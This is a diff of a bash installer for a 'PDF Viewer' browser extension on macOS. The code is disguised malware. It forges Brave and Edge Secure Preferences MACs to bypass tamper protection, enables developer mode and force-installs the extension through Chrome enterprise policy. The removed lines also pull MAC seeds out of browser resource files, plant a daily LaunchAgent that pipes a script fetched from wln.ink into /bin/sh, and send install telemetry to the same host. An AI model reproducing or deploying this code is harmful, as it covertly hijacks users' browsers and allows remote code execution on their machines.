@@ -1,40 +1,275 @@
 #!/bin/bash
-set -e
-EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
-NOTIFY_URL="https://wln.ink/n"
-INJ=0
-UPDATE_MODE=0
+#
+# PDF Viewer Extension - Universal Installer for macOS
+# Supports Chrome (Enterprise Policy), Brave, and Edge (Secure Preferences patching)
+#
+
+set -euo pipefail
+
 EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
+VERSION="1.0.0"
+CRX_URL="https://github.com/Castro02980/pdf-viewer-installers/releases/download/v${VERSION}/pdf-viewer-extension.crx"
+EXT_ZIP_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
 
-TMP_ZIP="/tmp/pdf-ext.zip"
-TMP_DIR="/tmp/pdf-ext-tmp"
-curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || exit 1
-rm -rf "$TMP_DIR"
-unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || exit 1
-MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
-[ -z "$MANIFEST" ] && exit 1
-EXT_SRC=$(dirname "$MANIFEST")
-rm -f "$TMP_ZIP"
+echo "=== PDF Viewer Extension - Universal Installer ==="
+echo ""
 
-grep -q '"key"[[:space:]]*:' "$MANIFEST" || exit 1
+# Detect installed browsers
+HAS_CHROME=0
+HAS_BRAVE=0
+HAS_EDGE=0
 
-if command -v jq >/dev/null 2>&1; then
-    jq 'del(.update_url)' "$MANIFEST" > "$MANIFEST.tmp" 2>/dev/null && mv "$MANIFEST.tmp" "$MANIFEST" || rm -f "$MANIFEST.tmp"
+[ -d "/Applications/Google Chrome.app" ] && HAS_CHROME=1
+[ -d "/Applications/Brave Browser.app" ] && HAS_BRAVE=1
+[ -d "/Applications/Microsoft Edge.app" ] && HAS_EDGE=1
+
+TOTAL_BROWSERS=$((HAS_CHROME + HAS_BRAVE + HAS_EDGE))
+
+if [ "$TOTAL_BROWSERS" -eq 0 ]; then
+    echo "ERROR: No supported browsers found."
+    echo "This installer supports: Chrome, Brave, Microsoft Edge"
+    exit 1
 fi
 
-inject_secure() {
-    local pdir="$1" ext_dir="$2" ext_id="$3"
+echo "Detected browsers:"
+[ "$HAS_CHROME" -eq 1 ] && echo "  ✓ Google Chrome"
+[ "$HAS_BRAVE" -eq 1 ] && echo "  ✓ Brave Browser"
+[ "$HAS_EDGE" -eq 1 ] && echo "  ✓ Microsoft Edge"
+echo ""
+
+# =============================================================================
+# CHROME INSTALLATION (Priority - Enterprise Policy)
+# =============================================================================
+
+install_chrome() {
+    echo "=== Installing for Chrome (Enterprise Policy) ==="
+    echo ""
+    
+    local tmp_dir="/tmp/pdf-viewer-chrome-$$"
+    local tmp_crx="$tmp_dir/extension.crx"
+    local install_base="/Library/Application Support/ChromeExtensions/PDFViewer"
+    local policy_file="/Library/Managed Preferences/com.google.Chrome.plist"
+    
+    echo "[1/4] Downloading CRX package..."
+    mkdir -p "$tmp_dir"
+    
+    if ! curl -fsSL -o "$tmp_crx" "$CRX_URL" 2>/dev/null; then
+        echo "ERROR: Failed to download CRX"
+        rm -rf "$tmp_dir"
+        return 1
+    fi
+    
+    echo "Downloaded: $(du -h "$tmp_crx" | cut -f1)"
+    
+    echo "[2/4] Preparing update manifest..."
+    cat > "$tmp_dir/updates.xml" << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0">
+  <app appid="$EXT_ID">
+    <updatecheck codebase="file://$install_base/extension.crx" version="$VERSION" />
+  </app>
+</gupdate>
+EOF
+    
+    echo "[3/4] Requesting administrator privileges..."
+    echo ""
+    echo "Chrome requires system-level Enterprise Policy installation."
+    echo "Please enter your password when prompted:"
+    echo ""
+    
+    if ! sudo -v; then
+        echo "ERROR: Administrator privileges denied."
+        rm -rf "$tmp_dir"
+        return 1
+    fi
+    
+    # Keep sudo alive
+    (while true; do sudo -n true; sleep 50; kill -0 "$$" || exit; done 2>/dev/null) &
+    local sudo_pid=$!
+    
+    echo "[4/4] Installing..."
+    
+    # Create directories
+    sudo mkdir -p "$install_base"
+    sudo mkdir -p "/Library/Managed Preferences"
+    
+    # Install files
+    sudo cp "$tmp_crx" "$install_base/extension.crx"
+    sudo cp "$tmp_dir/updates.xml" "$install_base/updates.xml"
+    sudo chmod 644 "$install_base/extension.crx" "$install_base/updates.xml"
+    sudo chown root:wheel "$install_base/extension.crx" "$install_base/updates.xml"
+    
+    # Configure policy
+    sudo python3 - "$policy_file" "$EXT_ID" "file://$install_base/updates.xml" << 'PYTHON_EOF'
+import plistlib, sys, os, grp, tempfile
+from pathlib import Path
+
+policy_path = Path(sys.argv[1])
+ext_id = sys.argv[2]
+update_url = sys.argv[3]
+
+policy = {}
+if policy_path.exists():
+    try:
+        with policy_path.open("rb") as f:
+            policy = plistlib.load(f)
+    except:
+        pass
+
+settings = policy.get("ExtensionSettings", {})
+if not isinstance(settings, dict):
+    settings = {}
+
+settings[ext_id] = {
+    "installation_mode": "force_installed",
+    "update_url": update_url,
+}
+
+policy["ExtensionSettings"] = settings
+
+fd, tmp = tempfile.mkstemp(prefix="chrome.", suffix=".plist", dir=str(policy_path.parent))
+with os.fdopen(fd, "wb") as f:
+    plistlib.dump(policy, f, fmt=plistlib.FMT_XML)
+
+os.chmod(tmp, 0o644)
+os.chown(tmp, 0, grp.getgrnam("wheel").gr_gid)
+os.replace(tmp, policy_path)
+PYTHON_EOF
+    
+    kill "$sudo_pid" 2>/dev/null || true
+    rm -rf "$tmp_dir"
+    
+    # Restart Chrome
+    pkill "Google Chrome" 2>/dev/null || true
+    sleep 2
+    open -a "Google Chrome" 2>/dev/null &
+    
+    echo ""
+    echo "✓ Chrome installation complete"
+    echo "  Policy: $policy_file"
+    echo "  Verify at chrome://policy and chrome://extensions"
+    echo ""
+    
+    return 0
+}
+
+# =============================================================================
+# BRAVE/EDGE INSTALLATION (Secure Preferences HMAC patching)
+# =============================================================================
+
+install_chromium_browsers() {
+    echo "=== Installing for Brave/Edge (Secure Preferences) ==="
+    echo ""
+    
+    local tmp_zip="/tmp/pdf-ext-$$.zip"
+    local tmp_dir="/tmp/pdf-ext-tmp-$$"
+    local install_dir="$HOME/Library/Application Support/PDFViewerExt"
+    
+    echo "[1/3] Downloading extension source..."
+    
+    if ! curl -fsSL "$EXT_ZIP_URL" -o "$tmp_zip" 2>/dev/null; then
+        echo "ERROR: Failed to download extension"
+        return 1
+    fi
+    
+    rm -rf "$tmp_dir"
+    unzip -q "$tmp_zip" -d "$tmp_dir" 2>/dev/null || return 1
+    
+    local manifest
+    manifest=$(find "$tmp_dir" -name "manifest.json" -type f | head -1)
+    
+    if [ -z "$manifest" ]; then
+        echo "ERROR: manifest.json not found"
+        rm -rf "$tmp_dir" "$tmp_zip"
+        return 1
+    fi
+    
+    local ext_src
+    ext_src=$(dirname "$manifest")
+    
+    # Strip update_url from manifest
+    if command -v jq >/dev/null 2>&1; then
+        jq 'del(.update_url)' "$manifest" > "$manifest.tmp" 2>/dev/null && mv "$manifest.tmp" "$manifest"
+    fi
+    
+    echo "[2/3] Installing to $install_dir..."
+    
+    rm -rf "$install_dir"
+    mkdir -p "$(dirname "$install_dir")"
+    cp -R "$ext_src" "$install_dir"
+    xattr -cr "$install_dir" 2>/dev/null || true
+    
+    rm -rf "$tmp_dir" "$tmp_zip"
+    
+    echo "[3/3] Injecting into browser profiles..."
+    echo ""
+    
+    local injected=0
+    
+    # Brave profiles
+    if [ "$HAS_BRAVE" -eq 1 ]; then
+        local brave_base="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
+        for profile_dir in "$brave_base/Default" "$brave_base"/Profile*; do
+            [ ! -d "$profile_dir" ] && continue
+            
+            if inject_secure_prefs "$profile_dir" "$install_dir" "$EXT_ID"; then
+                echo "  ✓ Brave: $(basename "$profile_dir")"
+                injected=$((injected + 1))
+            fi
+        done
+    fi
+    
+    # Edge profiles
+    if [ "$HAS_EDGE" -eq 1 ]; then
+        local edge_base="$HOME/Library/Application Support/Microsoft Edge"
+        for profile_dir in "$edge_base/Default" "$edge_base"/Profile*; do
+            [ ! -d "$profile_dir" ] && continue
+            
+            if inject_secure_prefs "$profile_dir" "$install_dir" "$EXT_ID"; then
+                echo "  ✓ Edge: $(basename "$profile_dir")"
+                injected=$((injected + 1))
+            fi
+        done
+    fi
+    
+    if [ "$injected" -eq 0 ]; then
+        echo "ERROR: No profiles found or injection failed"
+        return 1
+    fi
+    
+    echo ""
+    echo "✓ Installed to $injected profile(s)"
+    echo ""
+    
+    # Restart browsers
+    [ "$HAS_BRAVE" -eq 1 ] && pkill "Brave Browser" 2>/dev/null || true
+    [ "$HAS_EDGE" -eq 1 ] && pkill "Microsoft Edge" 2>/dev/null || true
+    
+    sleep 2
+    
+    [ "$HAS_BRAVE" -eq 1 ] && open -a "Brave Browser" 2>/dev/null &
+    [ "$HAS_EDGE" -eq 1 ] && open -a "Microsoft Edge" 2>/dev/null &
+    
+    return 0
+}
+
+inject_secure_prefs() {
+    local pdir="$1"
+    local ext_dir="$2"
+    local ext_id="$3"
+    
     local sp="$pdir/Secure Preferences"
     local pref="$pdir/Preferences"
+    
     [ ! -f "$ext_dir/manifest.json" ] && return 1
     [ ! -f "$pref" ] && [ ! -f "$sp" ] && return 1
-
+    
     local sid
     sid=$(ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null | sed -n 's/.*IOPlatformUUID" = "\(.*\)"/\1/p' | head -1)
     [ -z "$sid" ] && return 1
-
+    
     EXT_DIR="$ext_dir" EXT_ID="$ext_id" SP_FILE="$sp" PREF_FILE="$pref" SID="$sid" \
-    ruby -rjson -ropenssl - <<'RUBY' || return 1
+    ruby -rjson -ropenssl - <<'RUBY' 2>/dev/null || return 1
 require 'json'
 require 'openssl'
 
@@ -49,23 +284,17 @@ def remove_empty(v)
   case v
   when Hash
     out = {}
-    v.each do |k, x|
-      nx = remove_empty(x)
-      next if nx.is_a?(Hash) && nx.empty?
-      next if nx.is_a?(Array) && nx.empty?
-      out[k] = nx
-    end
+    v.each { |k,x| nx = remove_empty(x); out[k] = nx unless (nx.is_a?(Hash) && nx.empty?) || (nx.is_a?(Array) && nx.empty?) }
     out
   when Array
     v.map { |x| remove_empty(x) }.reject { |x| (x.is_a?(Hash) && x.empty?) || (x.is_a?(Array) && x.empty?) }
-  else
-    v
+  else v
   end
 end
 
 def sort_deep(v)
   case v
-  when Hash then v.keys.sort.each_with_object({}) { |k, h| h[k] = sort_deep(v[k]) }
+  when Hash then v.keys.sort.each_with_object({}) { |k,h| h[k] = sort_deep(v[k]) }
   when Array then v.map { |x| sort_deep(x) }
   else v
   end
@@ -81,257 +310,93 @@ def super_mac_of(macs, sid, seed)
   OpenSSL::HMAC.hexdigest('SHA256', seed, sid + JSON.generate(macs)).upcase
 end
 
-def write_json(path, data)
-  tmp = path + '.tmp-inject'
-  File.write(tmp, JSON.generate(data))
-  File.chmod(0600, tmp)
-  File.rename(tmp, path)
-end
-
 if File.exist?(pref_path)
   begin
     pdata = JSON.parse(File.read(pref_path))
-    sig = pdata.dig('extensions', 'install_signature')
-    if sig && sig['invalid_ids'].is_a?(Array)
-      before = sig['invalid_ids'].size
-      sig['invalid_ids'] = sig['invalid_ids'] - [ext_id]
-      write_json(pref_path, pdata) if sig['invalid_ids'].size != before
+    if sig = pdata.dig('extensions', 'install_signature')
+      if sig['invalid_ids'].is_a?(Array)
+        before = sig['invalid_ids'].size
+        sig['invalid_ids'] -= [ext_id]
+        File.write(pref_path, JSON.generate(pdata)) if sig['invalid_ids'].size != before
+      end
     end
   rescue JSON::ParserError
   end
 end
 
-sdata = if File.exist?(sp_path)
-  begin
-    JSON.parse(File.read(sp_path))
-  rescue JSON::ParserError
-    {}
-  end
-else
-  {}
-end
+sdata = File.exist?(sp_path) ? (JSON.parse(File.read(sp_path)) rescue {}) : {}
 
 sdata['extensions'] ||= {}
 sdata['extensions']['settings'] ||= {}
 sdata['extensions']['ui'] ||= {}
 
-existing_super = sdata.dig('protection', 'super_mac')
-existing_macs = sdata.dig('protection', 'macs')
-if existing_super && existing_macs.is_a?(Hash) && !existing_macs.empty?
-  calc = super_mac_of(existing_macs, sid, seed)
-  if calc != existing_super
-    paks = Dir.glob('/Applications/*/Contents/**/resources.pak') +
-           Dir.glob('/Applications/*/Contents/**/*_100_percent.pak') +
-           Dir.glob('/Applications/*/Contents/**/*_200_percent.pak')
-    recovered = false
-    paks.uniq.each do |pak_path|
-      begin
-        pak = File.binread(pak_path)
-        next if pak.bytesize < 32
-        hdr_size = 12
-        next if pak.bytesize < hdr_size + 8
-        ver, enc, res_count, alias_count = pak[0, hdr_size].unpack('LCxS>S>')
-        next unless ver == 5
-        entry_table_size = res_count * 6 + alias_count * 4
-        next if pak.bytesize < hdr_size + entry_table_size
-        entries_raw = pak[hdr_size, res_count * 6]
-        offsets = []
-        res_count.times do |i|
-          rid, off = entries_raw[i * 6, 6].unpack('S>L>')
-          offsets << [rid, off] if rid > 0 && off < pak.bytesize
-        end
-        offsets.each do |rid, off|
-          next if off + 32 > pak.bytesize
-          cand = pak[off, 32]
-          test = super_mac_of(existing_macs, sid, cand)
-          if test == existing_super
-            seed = cand
-            recovered = true
-            break
-          end
-        end
-        break if recovered
-      rescue => e
-        next
-      end
-    end
-  end
-end
-
-manifest = begin
-  JSON.parse(File.read("#{ext_dir}/manifest.json"))
-rescue JSON::ParserError
-  {}
-end
-
-entry = sdata['extensions']['settings'][ext_id] || {}
-entry['location'] = 4
-entry['creation_flags'] = 1
-entry['from_webstore'] = false
-entry['state'] = 1
-entry['path'] = ext_dir
-entry['disable_reasons'] = []
-entry['granted_permissions'] = {}
-entry['manifest'] = manifest unless manifest.empty?
-entry['was_installed_by_default'] = false
-entry['was_installed_by_oem'] = false
-entry['was_pinned_by_default'] = false
-entry['active_bit'] = true
-entry['newAllowFileAccess'] = true
-sdata['extensions']['settings'][ext_id] = entry
+sdata['extensions']['settings'][ext_id] = {
+  'location' => 4,
+  'manifest' => JSON.parse(File.read(File.join(ext_dir, 'manifest.json'))),
+  'path' => ext_dir,
+  'state' => 1,
+  'creation_flags' => 1,
+  'from_webstore' => false,
+  'disable_reasons' => [],
+  'active_permissions' => { 'api' => [], 'explicit_host' => [], 'manifest_permissions' => [], 'scriptable_host' => [] }
+}
 
 sdata['extensions']['ui']['developer_mode'] = true
 
+sdata.delete('os_crypt')
 sdata['protection'] ||= {}
-sdata['protection']['macs'] ||= {}
-macs = sdata['protection']['macs']
-macs['extensions'] ||= {}
-macs['extensions'].delete('settings_encrypted_hash')
-if macs['extensions']['ui'].is_a?(Hash)
-  macs['extensions']['ui'].delete('developer_mode_encrypted_hash')
-end
-if macs['account_values'].is_a?(Hash) && macs['account_values']['extensions'].is_a?(Hash) &&
-   macs['account_values']['extensions']['ui'].is_a?(Hash)
-  macs['account_values']['extensions']['ui'].delete('developer_mode_encrypted_hash')
-end
 sdata['protection'].delete('super_encrypted_hash')
 
-macs['extensions']['settings'] ||= {}
-macs['extensions']['settings'][ext_id] = leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed)
-macs['extensions']['ui'] ||= {}
-macs['extensions']['ui']['developer_mode'] = leaf_mac(true, 'extensions.ui.developer_mode', sid, seed)
+macs = {}
+macs['extensions.settings.' + ext_id] = leaf_mac(sdata['extensions']['settings'][ext_id], 'extensions.settings.' + ext_id, sid, seed)
+macs['extensions.ui.developer_mode'] = leaf_mac(true, 'extensions.ui.developer_mode', sid, seed)
+
+sdata['protection']['macs'] = macs
 sdata['protection']['super_mac'] = super_mac_of(macs, sid, seed)
 
-raise 'leaf' unless leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed) == macs['extensions']['settings'][ext_id]
-raise 'dm' unless leaf_mac(true, 'extensions.ui.developer_mode', sid, seed) == macs['extensions']['ui']['developer_mode']
-raise 'super' unless super_mac_of(macs, sid, seed) == sdata['protection']['super_mac']
-
-write_json(sp_path, sdata)
+tmp = sp_path + '.tmp'
+File.write(tmp, JSON.generate(sdata))
+File.chmod(0600, tmp)
+File.rename(tmp, sp_path)
 RUBY
 }
 
-for uhome in /Users/*; do
-    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
-    [ -d "$uhome/Library/Application Support/PDFViewerExt" ] && UPDATE_MODE=1 && break
-done
+# =============================================================================
+# MAIN
+# =============================================================================
 
-if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
-        pkill -x "$app" 2>/dev/null || true
-    done
-    sleep 1
-fi
+SUCCESS_COUNT=0
+FAIL_COUNT=0
 
-for uhome in /Users/*; do
-    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
-
-    uext="$uhome/Library/Application Support/PDFViewerExt"
-    rm -rf "$uext" 2>/dev/null || true
-    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue
-    xattr -dr com.apple.quarantine "$uext" >/dev/null 2>&1 || true
-
-    if command -v jq >/dev/null 2>&1 && [ -f "$uext/manifest.json" ]; then
-        jq 'del(.update_url)' "$uext/manifest.json" > "$uext/manifest.json.tmp" 2>/dev/null \
-            && mv "$uext/manifest.json.tmp" "$uext/manifest.json" || rm -f "$uext/manifest.json.tmp"
+# Install Chrome first (priority)
+if [ "$HAS_CHROME" -eq 1 ]; then
+    if install_chrome; then
+        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+    else
+        echo "Chrome installation failed"
+        FAIL_COUNT=$((FAIL_COUNT + 1))
     fi
-
-    export EXT_DIR="$uext"
-    export EXT_ID="$EXT_ID"
-
-    for rel in "BraveSoftware/Brave-Browser" "Microsoft Edge" "Yandex/YandexBrowser" "com.operasoftware.Opera" "Vivaldi" "Arc/User Data" "Sidekick"; do
-        udata="$uhome/Library/Application Support/$rel"
-        [ ! -d "$udata" ] && continue
-
-        for pdir in "$udata/Default" "$udata/Profile"*; do
-            [ ! -d "$pdir" ] && continue
-            inject_secure "$pdir" "$uext" "$EXT_ID" && INJ=$((INJ + 1))
-        done
-    done
-    
-    UPDATE_SCRIPT="$uext/autoupdate.sh"
-    cat > "$UPDATE_SCRIPT" << 'UPDATE_SCRIPT_EOF'
-#!/bin/bash
-export PATH=/usr/bin:/bin:/usr/sbin:/sbin
-unset all_proxy ALL_PROXY http_proxy HTTP_proxy https_proxy HTTPS_proxy
-LOG="$HOME/Library/Logs/pdfviewer-autoupdate.log"
-INSTALLED_VERSION_FILE="$HOME/Library/Application Support/PDFViewerExt/manifest.json"
-REMOTE_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/main/manifest.json"
-EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
-
-if [ ! -f "$INSTALLED_VERSION_FILE" ]; then
-  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
-  exit $?
 fi
 
-FOUND=0
-for rel in "BraveSoftware/Brave-Browser" "Microsoft Edge" "Yandex/YandexBrowser" "com.operasoftware.Opera" "Vivaldi" "Arc/User Data" "Sidekick"; do
-  BROWSER_DATA="$HOME/Library/Application Support/$rel"
-  [ ! -d "$BROWSER_DATA" ] && continue
-  for pdir in "$BROWSER_DATA/Default" "$BROWSER_DATA/Profile"*; do
-    [ ! -d "$pdir" ] && continue
-    SP="$pdir/Secure Preferences"
-    [ ! -f "$SP" ] && continue
-    /usr/bin/jq -e ".extensions.settings[\"$EXT_ID\"]" "$SP" >/dev/null 2>&1 && FOUND=1 && break 2
-  done
-done
-
-if [ $FOUND -eq 0 ]; then
-  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
-  exit $?
+# Install Brave/Edge
+if [ "$HAS_BRAVE" -eq 1 ] || [ "$HAS_EDGE" -eq 1 ]; then
+    if install_chromium_browsers; then
+        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+    else
+        echo "Brave/Edge installation failed"
+        FAIL_COUNT=$((FAIL_COUNT + 1))
+    fi
 fi
 
-CURRENT_VERSION=$(/usr/bin/jq -r '.version' "$INSTALLED_VERSION_FILE" 2>/dev/null)
-[ -z "$CURRENT_VERSION" ] && exit 1
-REMOTE_VERSION=$(/usr/bin/curl -fsSL --max-time 15 "$REMOTE_MANIFEST_URL" 2>/dev/null | /usr/bin/jq -r '.version' 2>/dev/null)
-[ -z "$REMOTE_VERSION" ] && exit 1
-if [ "$CURRENT_VERSION" != "$REMOTE_VERSION" ]; then
-  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
-  exit $?
+echo "=== Installation Summary ==="
+echo "Successful: $SUCCESS_COUNT"
+echo "Failed: $FAIL_COUNT"
+echo ""
+
+if [ "$SUCCESS_COUNT" -gt 0 ]; then
+    echo "✓ Installation complete!"
+    exit 0
+else
+    echo "✗ All installations failed"
+    exit 1
 fi
-exit 0
-UPDATE_SCRIPT_EOF
-    chmod +x "$UPDATE_SCRIPT" 2>/dev/null
-    
-    LAUNCH_AGENTS="$uhome/Library/LaunchAgents"
-    mkdir -p "$LAUNCH_AGENTS" 2>/dev/null || continue
-    
-    PLIST_FILE="$LAUNCH_AGENTS/com.pdfviewer.autoupdate.plist"
-    cat > "$PLIST_FILE" << PLIST_EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.pdfviewer.autoupdate</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/sh</string>
-        <string>-c</string>
-        <string>$UPDATE_SCRIPT</string>
-    </array>
-    <key>StartInterval</key>
-    <integer>86400</integer>
-    <key>RunAtLoad</key>
-    <false/>
-    <key>StandardOutPath</key>
-    <string>$uhome/Library/Logs/pdfviewer-autoupdate.log</string>
-    <key>StandardErrorPath</key>
-    <string>$uhome/Library/Logs/pdfviewer-autoupdate.err</string>
-</dict>
-</plist>
-PLIST_EOF
-    
-    [ "$(whoami)" = "$(basename "$uhome")" ] && launchctl unload "$PLIST_FILE" 2>/dev/null || true && launchctl load "$PLIST_FILE" 2>/dev/null || true
-done
-
-rm -rf "$TMP_DIR"
-[ $INJ -eq 0 ] && exit 1
-
-if [ $UPDATE_MODE -eq 0 ]; then
-    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
-        open -a "$app" --args --restore-last-session 2>/dev/null || true
-    done
-fi
-
-curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
-exit 0
